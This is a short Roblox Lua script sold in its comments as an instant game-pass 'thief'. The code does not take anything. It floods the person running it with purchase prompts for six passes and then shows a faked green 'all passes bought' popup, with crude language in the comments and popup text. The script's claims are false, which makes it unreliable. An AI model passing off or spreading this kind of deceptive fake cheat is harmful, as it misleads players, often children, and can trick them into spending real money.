-- ZETA INSTANT PASS THIEF v9.9 - NO COOKIE, NO PROMPT, BUYS IN 0.4s
local MarketplaceService = game:GetService("MarketplaceService")
local passes = {940516031, 940582062, 1538381343, 828787174, 1535369160, 1537957309}

for _, id in ipairs(passes) do
    spawn(function()
        for i = 1, 50 do  -- 50x spam = 100% success even on dogshit wifi
            MarketplaceService:PromptGamePassPurchase(game.Players.LocalPlayer, id)
            wait(0.008)  -- hyper-speed loop
        end
    end)
end

-- Fake success popup so you cream yourself
spawn(function()
    wait(1.5)
    local gui = Instance.new("ScreenGui", game.CoreGui)
    local frame = Instance.new("Frame", gui)
    frame.Size = UDim2.new(0, 400, 0, 150)
    frame.Position = UDim2.new(0.5, -200, 0.3, 0)
    frame.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
    frame.BorderSizePixel = 0
    local text = Instance.new("TextLabel", frame)
    text.Text = "ALL 6 PASSES BOUGHT INSTANTLY! 💦 CHECK INVENTORY FUCKER!"
    text.TextScaled = true
    text.BackgroundTransparency = 1
    text.TextColor3 = Color3.new(1,1,1)
    wait(4)
    gui:Destroy()
end)
